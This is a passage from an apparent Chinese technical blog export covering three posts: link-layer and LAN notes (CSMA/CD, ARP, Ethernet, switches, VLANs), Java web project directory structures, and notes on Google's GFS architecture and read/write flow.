<h4 id="3-2-3-具有碰撞检测的载波侦听多路访问（CSMA-x2F-CD）"><a href="#3-2-3-具有碰撞检测的载波侦听多路访问（CSMA-x2F-CD）" class="headerlink" title="3.2.3. 具有碰撞检测的载波侦听多路访问（CSMA&#x2F;CD）"></a>3.2.3. 具有碰撞检测的载波侦听多路访问（CSMA&#x2F;CD）</h4><p>CSMA&#x2F;CD 在 CSMA 的基础上，加入了<strong>碰撞检测（collision detection）</strong>。传输节点在传输时会一直监听此信道，如果它检测到另一个节点正在发送干扰帧并产生碰撞，就停止传输，并等待一段随机时间后，重复“侦听——当空闲时传输——碰撞则等待”。</p>
<p>CSMA&#x2F;CD 具体过程如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/11.png" alt="pic"></p>
<p>算法中有一个很重要的随机时间，如果随机范围太大，则会降低节点效率；如果随即范围太小，则可能会再次碰撞。</p>
<p>为了解决这个问题，人们提出了 <strong>二进制指数后退（binary exponential backoff）</strong> 算法。算法十分简单，即：当该帧经历了 $n$ 次碰撞后，节点将随机从 ${0,1,2…2^n-1}$ 中选择一个 $K$ 值，等待 $K$ 倍数的时间。因此，一个帧经历的碰撞越多，$K$ 选择的范围也会越大。</p>
<h3 id="3-3-轮流协议"><a href="#3-3-轮流协议" class="headerlink" title="3.3. 轮流协议"></a>3.3. 轮流协议</h3><p><strong>多路访问协议的两个理想特性</strong>是：</p>
<ol>
<li>当只有一个节点活跃时，该节点具有 $R bps$ 的吞吐量。</li>
<li>当有 $M$ 个节点活跃时，每个节点都有接近 $R&#x2F;M bps$ 的吞吐量。</li>
</ol>
<p>信道划分协议具备第2个特性，却不具备第1个；随机接入协议具备第1个特性，却不具备第2个。</p>
<p>为了同时实现这两种特性，人们又发明了<strong>轮流协议（taking-turns protocol）</strong>。轮流协议有很多，我们只讨论两种比较重要的协议：</p>
<ul>
<li><p><strong>轮询协议（polling protocol）</strong>。协议会从所有节点中指定一个主节点，主节点 <strong>轮询（poll）</strong> 每个节点。例如，主节点会先询问节点1，如果它要发送数据，那么主节点会告诉它能传输的帧的最多数量，传输完毕后主节点会接着询问节点，周而复始。虽然轮询协议避免了碰撞和空时隙的问题，提高了效率，但也有一些<strong>缺点</strong>：</p>
<ul>
<li>引入了轮询时延。节点需要等待主节点轮询到它，才能发送数据。</li>
<li><strong>若主节点发生故障，整个信道就不能使用了</strong>。</li>
</ul>
</li>
<li><p><strong>令牌传递协议（token-passing protocol）</strong>。一个称为 <strong>令牌（token）</strong> 的小特殊帧会在节点之间循环传递。当一个节点要发送数据时，它会持有这个令牌，并传输所有数据，然后再释放令牌；当不需要发送数据时，则传给下一个节点。令牌传递协议同样也存在着一些问题，例如：一个节点故障可能导致整个信道崩溃，或者一个节点忘记释放令牌等。</p>
</li>
</ul>
<h2 id="4-交换局域网"><a href="#4-交换局域网" class="headerlink" title="4. 交换局域网"></a>4. 交换局域网</h2><h3 id="4-1-链路层寻址——MAC地址"><a href="#4-1-链路层寻址——MAC地址" class="headerlink" title="4.1. 链路层寻址——MAC地址"></a>4.1. 链路层寻址——MAC地址</h3><p>主机与路由器都拥有链路层地址。但严格来讲，并不是主机和路由器拥有链路层地址，而是<strong>网络适配器（网络接口&#x2F;网卡）拥有链路层地址</strong>。具有多个网卡的主机或路由器将具有多个链路层地址，也具有多个IP地址。</p>
<p>链路层地址有许多不同的称呼：<strong>LAN 地址</strong>、<strong>物理地址</strong> 或 <strong>MAC 地址</strong>，其中 MAC 地址最为常用。</p>
<p>对大多数局域网而言，MAC 地址长度为 6 字节，通常用十六进制表示，如 <code>1A-23-F9-CD-06-9B</code> 。网卡上的 MAC 地址是与生俱来的，也是固定的（现在可以改变，但我们不考虑），而且<strong>没有两块网卡的 MAC 地址是相同的</strong>。不论网卡到何处，MAC 地址都不会改变。</p>
<p>到此，你或许会疑惑：<strong>为什么网络层与链路层都需要地址呢</strong>？且听我慢慢道来。</p>
<ul>
<li>MAC 地址是扁平结构，且每个地址全球唯一，不论身在何处，它相当于<strong>身份证</strong>；IP 地址则是层次结构，主机移动时 IP 地址需要改变，它用来定位，相当于<strong>邮政地址</strong>。</li>
<li>链路层是为任意网络层协议而设计的，而不只是用于 IP 协议。如果网卡被指派 IP 地址，而不是“中性”的 MAC 地址，那将不能用于其它网络层协议。</li>
<li>若网卡使用网络层地址，那网络层地址就不能“刻”在网卡上，每次移动主机都得重新配置；或者网卡不使用任何地址，而直接交付给网络层，但这样的话，主机将被局域网发送的每个帧而<strong>中断</strong>，即使帧的目的地不是自己。</li>
</ul>
<p>在局域网中，网卡会接收每一个发送的帧，并检查帧中目的 MAC 地址是否与自己 MAC 地址匹配。如果匹配，则取出帧中数据，向上层传递；如果不匹配，则丢弃该帧。</p>
<p>与 IP 协议一样，MAC 也有<strong>广播地址</strong>，即比特全为 1 的 MAC 地址，用于向局域网所有其它主机广播信息。</p>
<h3 id="4-2-地址解析协议-ARP"><a href="#4-2-地址解析协议-ARP" class="headerlink" title="4.2. 地址解析协议 ARP"></a>4.2. 地址解析协议 ARP</h3><p>当网络层将数据报传给链路层时，链路层只知道目的 IP 地址，那它如何才能知道帧的目的 MAC 地址呢？这就是 <strong>地址解析协议（Address Resolution Protocol，ARP）</strong> 的任务了。</p>
<p>接下来，将通过两种情况了解 ARP 协议。</p>
<h4 id="4-2-1-在子网内发送数据报"><a href="#4-2-1-在子网内发送数据报" class="headerlink" title="4.2.1. 在子网内发送数据报"></a>4.2.1. 在子网内发送数据报</h4><p>每台主机或路由器在<strong>内存</strong>中都有一个 <strong>ARP 表</strong>，它包含 IP 地址到 MAC 地址的映射关系，以及每个映射的寿命（TTL）。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/12.png" alt="pic"></p>
<p>现假设主机 <code>222.222.222.220</code> 要向主机 <code>222.222.222.222</code> 发送数据报，但它的 ARP 表并未存在映射关系。当数据报传至链路层时，主机 <code>222.222.222.220</code> 需要用 ARP 解析协议来获取目的主机的 MAC 地址：</p>
<ul>
<li><p>首先，<code>222.222.222.220</code> 主机会发送一个 <strong>ARP 查询分组</strong>，并使用 MAC 广播地址（FF-FF-FF-FF-FF-FF）为目的 MAC 地址。</p>
</li>
<li><p>该分组将被子网中所有主机或路由器接收到，这些主机或路由器将检查分组中的目的 IP 地址是否与自己的 IP 地址相同。若相同，则发送一个 <strong>ARP 响应分组</strong>。</p>
</li>
<li><p>源主机收到响应分组后，便会更新它的 ARP 表，然后正式发送数据报到 <code>222.222.222.222</code> 主机。</p>
</li>
</ul>
<h4 id="4-2-2-发送数据报到子网外"><a href="#4-2-2-发送数据报到子网外" class="headerlink" title="4.2.2. 发送数据报到子网外"></a>4.2.2. 发送数据报到子网外</h4><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/13.png" alt="pic"></p>
<p>如上图所示，现有两个子网 <code>111.111.111/24</code> 和 <code>222.222.222/24</code>，假设主机 <code>111.111.111.111</code> 要向主机 <code>222.222.222.222</code> 发送数据报。由于子网 <code>111.111.111/24</code> 中并不存在主机 <code>222.222.222.222</code> ，所以 ARP 协议并不能获取目的 MAC 地址，那怎么办呢？</p>
<ul>
<li><p>首先，主机通过自己的子网信息，得知目的 IP 地址并不在自己的子网中，所以它会<strong>把目的 MAC 地址设为网关（路由器）接口的 MAC 地址</strong>。由于主机联网时便知道网关路由器的 IP 地址，所以它可以通过 ARP 协议获取网关路由器的 MAC 地址。</p>
</li>
<li><p>将数据报发送到网关路由器后，路由器会根据<strong>路由表</strong>选择输出链路接口，将数据报传递到对应接口的适配器中，准备发送。</p>
</li>
<li><p>帧的源 MAC 地址是路由器输出接口的 MAC 地址，而目的 MAC 地址是如何知道的呢？当然是 ARP ！路由器会向对应子网中发送 ARP 查询分组，从而获取目的 IP 地址对应的 MAC 地址。</p>
</li>
</ul>
<h3 id="4-3-以太网（Ethernet）"><a href="#4-3-以太网（Ethernet）" class="headerlink" title="4.3. 以太网（Ethernet）"></a>4.3. 以太网（Ethernet）</h3><p><strong>以太网（Ethernet）是当今最流行的有线局域网技术</strong>，甚至将一直保持这一位置。最初它使用了总线型拓扑和CSMA&#x2F;CD技术，后来由于交换机的出现，它成为了星型拓扑和无碰撞局域网。</p>
<p>它的成功有很多原因：首先，它是第一个广泛部署的高速局域网；其次，它比令牌环等技术更加简单、便宜；第三，它奋发上进，不断产生更高速率的版本，以抵抗其他技术的竞争。</p>
<p>20世纪80年代到90年代，初始的以太网，使用基于<strong>同轴电缆</strong>的<strong>总线拓扑</strong>结构，是广播局域网。</p>
<p>20世纪90年代后其，人们使用基于<strong>集线器</strong>的<strong>星形拓扑</strong>结构，依旧是广播局域网。</p>
<p>21世纪初，以太网经历了革命性变化，<strong>交换机</strong>代替了<strong>集线器</strong>，以太网成为了“无碰撞”局域网。</p>
<p>以太网帧结构如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/15.png" alt="pic"></p>
<p>各字段详情如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/16.png" alt="pic"></p>
<p>特此说明，以太网提供的是无连接、不可靠服务。即适配器在发送帧之前，不会与目标适配器握手；发送帧之后，也不知道目标适配器是否收到，而且如果某帧出现差错没有通过 CRC 效验，目标适配器则会丢弃该帧。</p>
<p>如今，以太网已发展了多种类型，各有各的特色。这些以太网技术，在多年中已经被 <strong>IEEE 802.3</strong> 工作组标准化了。</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/23.png" alt="pic"></p>
<h3 id="4-4-链路层交换机"><a href="#4-4-链路层交换机" class="headerlink" title="4.4. 链路层交换机"></a>4.4. 链路层交换机</h3><p>此前提到，基于交换机的以太网已成为主流。由于交换机是<strong>全双工</strong>的（同时向对方发送消息不会受到干扰），而且具有<strong>存储转发</strong>的功能，只转发帧到对应的端口。<strong>所以交换以太网不再是广播信道，也不会出现碰撞</strong>，甚至都不再需要使用多路访问协议了。</p>
<p>为什么交换机如此神奇呢？它的原理是什么呢？</p>
<h4 id="4-4-1-交换机的转发和过滤"><a href="#4-4-1-交换机的转发和过滤" class="headerlink" title="4.4.1. 交换机的转发和过滤"></a>4.4.1. 交换机的转发和过滤</h4><p>过滤是决定一个帧应该转发还是丢弃，转发是决定一个帧该被导向到哪个接口。</p>
<p>这两个功能都借助于<strong>交换机表（switch table）</strong>，表中每个表项都包含：一个 MAC 地址；通向该地址的交换机接口；表项放置在表中的时间。示例如下：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/17.png" alt="pic"></p>
<p>现假设目的 MAC 地址为 <code>DD-DD-DD-DD-DD-DD</code> 的帧从接口 <code>x</code> 到达交换机：</p>
<ul>
<li>表中没有 <code>DD-DD-DD-DD-DD-DD</code> 的表项，则向所有接口广播该帧。</li>
<li>表中存在 <code>DD-DD-DD-DD-DD-DD</code> 但对应的接口是 <code>x</code> ，则丢弃该帧。</li>
<li>表中存在 <code>DD-DD-DD-DD-DD-DD</code> 且接口为 <code>y</code>，则将帧转发到该接口。</li>
</ul>
<h4 id="4-4-2-自学习"><a href="#4-4-2-自学习" class="headerlink" title="4.4.2. 自学习"></a>4.4.2. 自学习</h4><p>交换机另一个神奇的特性是：<strong>自学习</strong>。交换机表是自动、动态地建立的，不需要人为配置，所以交换机是一个<strong>即插即用设备</strong>。</p>
<p>那交换机是如何实现自学习的呢？</p>
<ol>
<li>交换机表初始为空。</li>
<li>对于每一个到达交换机的入帧，交换机都会在表中存储一个表项：<strong>该帧的源 MAC 地址；该帧进入的接口；当前时间</strong>。只要局域网中的主机发送了一个帧，那它就会在交换机中留下记录。</li>
<li>如果一段时间后，交换机没有收到以该地址为源地址的帧，就会从表中删除这个地址。</li>
</ol>
<h3 id="4-5-虚拟局域网"><a href="#4-5-虚拟局域网" class="headerlink" title="4.5. 虚拟局域网"></a>4.5. 虚拟局域网</h3><p>虽然交换机简单又好用，但也存在着一些问题（以下图为例）：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/19.png" alt="pic"></p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/18.png" alt="pic"></p>
<p>为了解决这些问题，<strong>虚拟局域网（VLAN）</strong> 出现了，它可以将一个物理局域网划分成多个虚拟局域网，虚拟局域网之间互不干扰。如下图：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/20.png" alt="pic"></p>
<p>但新的问题是：不同 VLAN 之间如何通信呢？</p>
<p>最简单的方法是，用一个路由器将两个 VLAN 连接起来。幸运的是，综合 VLAN 交换机和路由器的单一设备的出现，使这个方法更为容易。</p>
<p>另一种方法则被称为 <strong>VLAN 干线连接（VLAN trunking）</strong>：</p>
<p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/21.png" alt="pic"></p>
<h2 id="5-Web-页面请求历程"><a href="#5-Web-页面请求历程" class="headerlink" title="5. Web 页面请求历程"></a>5. Web 页面请求历程</h2><p><img src="/%E3%80%8A%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E3%80%8B%E7%AC%94%E8%AE%B0-%E7%AC%AC6%E7%AB%A0%E9%93%BE%E8%B7%AF%E5%B1%82%E5%92%8C%E5%B1%80%E5%9F%9F%E7%BD%91/22.png" alt="pic"></p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>再遇javaweb</title>
    <url>/%E5%86%8D%E9%81%87javaweb.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>从最初的<code>servlet</code>、<code>Tomcat</code>，到笨重的<code>ofbiz</code>框架，再跳至<code>spring boot</code>，现在又邂逅了<code>jfinal</code>(国内框架，迫于项目要求)。</p>
<p><code>javaweb</code>的开发之路上，遇见了诸多框架，虽然都有些浅尝辄止，但也想对<code>javaweb</code>中的<strong>项目结构</strong>进行自我的总结归纳。</p>
<p>其缘由呢，是因为此次碰见的<code>jfinal</code>框架，它支持 热加载(内置服务器) 和 依托<code>Tomcat</code> 两种运行方式。同时，我们可以规范成 <strong>传统 javaweb 标准项目结构</strong> 和 <strong>maven 标准项目结构</strong>。</p>
<p>接下来主要讨论这两种标准项目结构。</p>
<span id="more"></span>

<h2 id="1-传统-javaweb-标准项目结构"><a href="#1-传统-javaweb-标准项目结构" class="headerlink" title="1. 传统 javaweb 标准项目结构"></a>1. 传统 javaweb 标准项目结构</h2><p>传统的javaweb项目都需要运行在Tomcat上，以<code>SSH</code>项目为代表：</p>
<p><img src="/%E5%86%8D%E9%81%87javaweb/2.png" alt="img"></p>
<p>相对重要的目录结构(从项目根目录开始)总结如下：</p>
<ul>
<li><p><code>src\</code>： 源代码目录</p>
</li>
<li><p><code>resources\(或 res\)</code>： 配置文件的目录，包含<code>config.properties</code>等配置文件。同<code>src\</code>目录一样，需要被标记成<code>Sources</code>目录，如在IDEA中：</p>
<p>  <img src="/%E5%86%8D%E9%81%87javaweb/5.png" alt="img"></p>
</li>
<li><p><code>WebRoot\(或 WebContent\)</code>： 用于最终web应用的发布目录，包含静态文件、编译后的.class文件、依赖的jar包等</p>
<ul>
<li><p><code>static\</code>： css, js等静态文件目录</p>
</li>
<li><p><code>WEB-INF\</code>： web应用信息目录</p>
<ul>
<li><p><code>views\</code>： html, jsp等页面文件目录</p>
</li>
<li><p><code>classes\</code>： 项目源码编译后<code>.class</code>文件存放的目录</p>
</li>
<li><p><code>lib\</code>： 项目依赖<code>jar</code>包存放的目录</p>
</li>
<li><p><code>web.xml</code>： web应用在容器中注册和部署的描述文件</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>具体项目的结构如下：</p>
<p><img src="/%E5%86%8D%E9%81%87javaweb/4.png" alt="img"></p>
<h2 id="2-maven-标准项目结构"><a href="#2-maven-标准项目结构" class="headerlink" title="2. maven 标准项目结构"></a>2. maven 标准项目结构</h2><h3 id="2-1-运行Tomcat上"><a href="#2-1-运行Tomcat上" class="headerlink" title="2.1. 运行Tomcat上"></a>2.1. 运行Tomcat上</h3><p>以<code>Spring MVC maven</code>项目为代表：</p>
<p><img src="/%E5%86%8D%E9%81%87javaweb/1.png" alt="img"></p>
<p>相对重要目录结构总结如下：</p>
<ul>
<li><p><code>src\</code>： 源代码目录</p>
<ul>
<li><p><code>main\</code>： 应用代码目录</p>
<ul>
<li><p><code>java\</code>： java代码目录</p>
</li>
<li><p><code>resources\</code>： 项目配置文件目录</p>
</li>
<li><p><code>webapp\</code>： 相当于<code>WebRoot\</code>目录</p>
<ul>
<li><p><code>static\</code>： css, js等静态文件目录</p>
</li>
<li><p><code>WEB-INF\</code>： web应用信息目录，但不同于<strong>非maven项目</strong>，其没有<code>classes\</code>和<code>lib\</code>目录</p>
<ul>
<li><p><code>views\</code>： html, jsp等页面文件目录</p>
</li>
<li><p><code>web.xml</code>： web应用在容器中注册和部署的描述文件</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><code>test\</code>： 测试代码目录</p>
</li>
</ul>
</li>
<li><p><code>target\</code>： 编译后的目录</p>
</li>
<li><p><code>pom.xml</code>： Maven工程的配置文件</p>
</li>
</ul>
<h3 id="2-2-热加载"><a href="#2-2-热加载" class="headerlink" title="2.2. 热加载"></a>2.2. 热加载</h3><p>以<code>Spring Boot</code>为代表，具体项目目录结构如下：</p>
<p><img src="/%E5%86%8D%E9%81%87javaweb/3.png" alt="img"></p>
<p>不同于<strong>运行在Tomcat上的maven项目</strong>：</p>
<ul>
<li><p>其不需要<code>webapp\</code>目录，因为热加载不需要<code>Tomcat</code>容器；</p>
</li>
<li><p>静态文件放在<code>resources\</code>目录下</p>
</li>
</ul>
<h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>传统javaweb项目与maven项目的目录结构相差较大，但源代码中的<code>dao</code>, <code>controller</code>, <code>service</code>, <code>bean</code>层分布是不变的。</p>
<p>运行于Tomcat容器的项目，一般都需要<code>WebRoot\</code>(传统javaweb)或<code>webapp\</code>(maven)目录；而热加载项目(自带容器)，则不需要。</p>
<p>参考博客：<a href="https://www.csdn.net/gather_2a/NtTakgwsNDYwLWJsb2cO0O0O.html">https://www.csdn.net/gather_2a&#x2F;NtTakgwsNDYwLWJsb2cO0O0O.html</a></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式之GFS</title>
    <url>/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BGFS.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>2000年前后，随着互联网的飞速发展，单机的存储和计算能力早已达到瓶颈，急需通过增加机器数量来提高整体性能。但是，<strong>1+1并不大于2</strong>，机器数量的增加带来了许多新的问题：网络延迟、机器宕机、数据不一致等等。正是为了解决这些问题，Google在2003-2006年间先后发表了3篇论文《GFS》、《MapReduce》、《Bigtable》，分别解决了大规模数据的存储(非结构化)、计算、索引(结构化数据&#x2F;数据库)，这三篇也被称为Google三驾马车，鉴定了分布式大数据时代的基础。后来的开源项目Hadoop中，HDFS参考了《GFS》，MapReduce参考了《MapReduce》，HBase参考了《Bigtable》。</p>
<p>GFS首先被提出，它在大规模分散的机器上，实现了类似Linux文件系统的分布式存储系统。单台机器读写数据的性能有限，对于数亿GB的海量，肯定不能存放在单台机器上，而应将数据分割存储到多台机器上。同时，还需考虑机器宕机、磁盘损坏的问题，对同一份数据应做多个<strong>备份</strong>。如此又会出现许多新问题：如何在多台机器中找到用户想要的数据？如何保证系统在部分机器失效的情况下仍能正常运行？如何保证多个备份数据的一致？如何保证较高的读写性能？这些问题都将GFS中得到解决。</p>
<span id="more"></span>

<h2 id="1-设计假设"><a href="#1-设计假设" class="headerlink" title="1. 设计假设"></a>1. 设计假设</h2><ul>
<li><p>建立在大量廉价的机器上，机器经常会失效，因此需要不停地监控-容错-恢复。</p>
</li>
<li><p>适用于存储大文件（MB或GB）。</p>
</li>
<li><p>大的流式顺序读，小的随机读。顺序读取连续的大批量数据（MB），只在某个位置偏移几KB范围内的随机读取。</p>
</li>
<li><p>一旦写入，就很少被修改。</p>
</li>
<li><p>同一时刻，同一文件，可能被多个客户端并发地追加数据，因此需要保证最小同步操作（追加）的原子性(Atomicity with minimal synchronization overhead is essential)。</p>
</li>
<li><p>高持久的带宽（批量处理数据）比低延迟（单个读写操作的响应时间）更加重要。</p>
</li>
</ul>
<h2 id="2-架构"><a href="#2-架构" class="headerlink" title="2. 架构"></a>2. 架构</h2><p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BGFS/image_T24ae31M43.png" alt="1"></p>
<ul>
<li><p>GFS集群中包含<strong>1个master</strong>和<strong>多个chunkserver</strong>。</p>
</li>
<li><p>GFS中，<strong>每个文件被划分成固定大小的chunk</strong>（默认64MB），每个chunk都有一个<strong>全局唯一的64bit的标识（chunk handle, 句柄）</strong>，每个chunk被<strong>备份到多个chunkserver</strong>（默认3个）。</p>
</li>
<li><p><strong>master只保存元数据</strong>，比如：文件命名空间、文件对应每个chunk的chunk handle、每个chunk所在的chunkserver等等。<strong>master和chunkserver通过周期性的心跳进行通信</strong>。</p>
</li>
<li><p>chunkserver负责保存chunk数据，它会将chunk以<strong>Linux文件</strong>的形式存储在本地。客户端可通过chunk handle和字节范围（0~64MB）来获取chunk内数据。</p>
</li>
</ul>
<h3 id="master元数据"><a href="#master元数据" class="headerlink" title="master元数据"></a>master元数据</h3><p>master主要存储3类元数据：</p>
<ul>
<li><p>文件命名空间(namespace)。</p>
</li>
<li><p>文件和chunk的映射关系：file name -&gt; array of chunk handles。每个文件都对应一个chunk handle数组，数组第i个元素是文件中第i个chunk的标识(handle)。</p>
</li>
<li><p>每个chunk对应的相关信息：chunk handle -&gt;</p>
<ul>
<li><p>存储位置list of chunkservers，1个chunk会被复制并存储到多个chunkserver上（备份，用于容错）。</p>
</li>
<li><p>版本号version，用于判断是否最新。</p>
</li>
<li><p>主副本primary，用于写操作。</p>
</li>
<li><p>租约lease，用于写操作。</p>
</li>
</ul>
</li>
</ul>
<p>上述元数据都会存在于<strong>内存</strong>中，以此提高操作效率。</p>
<p>前2个元数据的<strong>变更操作</strong>，会以<strong>日志</strong>的形式记录，并<strong>持久化</strong>保存到本地磁盘，同时备份到远程机器上（容错）。当master重启时，会重放日志来恢复关键信息。为了缩短恢复时间，master会在日志超过一定长度时，设置一个**检查点(checkpoints)**。恢复时，只需要最新的检查点和之后的日志。checkpoint是一个压缩的类B-Tree结构，可以被直接映射到内存中并用于namespace的查找。</p>
<p><strong>chunk的存储位置并不会持久化保存</strong>，而是在master启动后向每个chunkserver询问得知。master会通过周期性心跳检测与chunkserver通信，保证自己的chunk信息是最新的。为什么不持久化保存chunk的位置信息？因为在数百台机器的集群中，chunkserver加入或离开、重启、宕机等情况经常发生，<strong>chunk的位置信息需要经常变更、并不稳定，持久化没有太大意义</strong>。</p>
<p>但<strong>chunk版本号需要持久化</strong>，master需要通过chunk版本号判断chunkserver的chunk副本是不是最新的。为什么不向chunkserver询问chunk的版本号，然后取其中最大值呢？因为master询问时，持有最新chunk副本的chunkserver可能出现宕机等意外情况，导致master将过时的副本当作最新版本。<strong>master只会返回包含最新chunk的chunkserver</strong>，如果所有chunkserver都不包含该chunk的最新版本，master会让客户端等待或返回错误。</p>
<h2 id="3-系统交互"><a href="#3-系统交互" class="headerlink" title="3. 系统交互"></a>3. 系统交互</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>如图1所示，一次简单的读文件过程如下：</p>
<ol>
<li><p>客户端根据要读取的文件名和偏移量，计算出chunk index，比如：读取文件第65MB至第80MB间的数据，其所在的chunk index为65MB&#x2F;64MB &#x3D; 1。</p>
</li>
<li><p>客户端向master发生文件名和chunk index，master会返回chunk handle和chunk所在的chunk server列表。</p>
</li>
<li><p>客户端向其中一个chunkserver发送请求，指定chunk handle和读取的字节范围，chunkserver返回相应的数据。</p>
</li>
</ol>
<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>写文件，包括对文件内容的修改和追加，每个写的变更操作都需要在对应chunk的<strong>所有副本上执行</strong>。</p>
<p>对于一组变更操作，GFS通过<strong>租约(leases)<strong>来保证多个副本间变更顺序的一致性。master会向其中一个副本授予chunk租约，这个副本被称为</strong>主副本(primary)<strong>。主副本会对该chunk的所有变更选择一个顺序，然后所有的副本就会按照这个顺序去执行这些变更。租约的持续时间为60s，主副本可以向master请求延长租约。master可以在租约到期前撤销授权。</strong>若master与主副本失去通信，并不需要立即选择新的主副本（可能只是暂时的网络阻塞），它可以在旧租约过期后，安全地授权租约给另一个副本（避免同时出现两个主副本）。</strong> 授权和请求都伴随chunkserver和master间的心跳信息一起发送。</p>
<p>一次写操作过程如下：</p>
<p><img src="/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B9%8BGFS/image_NS3NXlZMea.png" alt="1"></p>
<ol>
<li><p>客户端会请求master所有副本位置，以及哪一个chunkserver持有当前的租约（谁是主副本）。如果没有副本持有租约，master会选一个副本授权租约给它（即设为主副本）。</p>
</li>
<li><p>master返回该主副本的标识(handle)和所有副本的位置信息，客户端<strong>缓存</strong>这些数据用于未来的变更。只有当主副本没有响应，或者发现租约已经到期了，客户端才会和master联系。</p>
</li>
<li><p>客户端向所有副本对应的chunkserver推送数据，可按任意顺序。chunkserver会缓存这些数据，直到被使用或过期。GFS通过<strong>分离控制流和数据流</strong>，将重要的数据流基于网络拓扑来进行调度，而不用考虑哪一个是主副本，从而提高性能。</p>
</li>
<li><p>一旦所有副本都确定收到数据，客户端会向主副本发送一个写请求，该请求标识了之前推送给所有副本的数据。然后，<strong>主副本会给它接收到的所有变更（可能来自于多个客户端）分配连续的序列号</strong>，并按照序列号将变更应用到本地的副本上。</p>
</li>
<li><p>主副本向其它副本发送写请求，每个副本都按照主副本规定的顺序应用这些变更。</p>
</li>
<li><p>其它副本变更完成后，会向主副本返回成功。</p>
</li>
<li><p>主副本再向客户端返回成功。任何副本碰到错误，都会返回给客户端。出现错误时，变更可能已经在主副本和部分副本上执行成功了（<strong>部分执行成功的变更会撤销吗？不会！</strong>）。若返回错误，客户端会重试这些变更，它会先重试3-7步骤，如果不行则从头重试写操作。</p>
</li>
</ol>
<p>如果一个写操作数据量很大或跨chunk边界，GFS客户端会将其分割为多个写操作。</p>
